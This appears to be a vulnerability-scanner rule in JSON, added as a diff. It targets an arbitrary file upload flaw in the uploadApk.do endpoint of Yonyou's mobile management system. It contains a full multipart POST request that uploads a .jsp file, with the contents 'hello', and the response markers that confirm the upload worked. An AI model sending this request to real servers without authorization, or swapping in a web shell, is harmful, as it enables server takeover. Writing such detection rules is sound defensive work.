@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友 移动管理系统 uploadApk.do 任意文件上传漏洞",
+    "level": "高危",
+    "description": "用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限",
+    "product": "用友 移动管理系统",
+    "version": "用友 移动管理系统 ",
+    "cve": "无",
+    "reference": "https://peiqi.wgpsec.org/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20uploadApk.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html",
+    "fixing": "联系厂商打补丁",
+    "rule": {
+        "path": "/maportal/appmanager/uploadApk.do?pk_obj=",
+        "method": "POST",
+        "headers": "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nCookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server\r\nConnection: close",
+        "body": "------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\nContent-Disposition: form-data; name=\"downloadpath\"; filename=\"a.jsp\"\r\nContent-Type: application/msword\r\n\r\nhello\r\n------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--",
+        "status_code": "200",
+        "keywords": "status;2",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
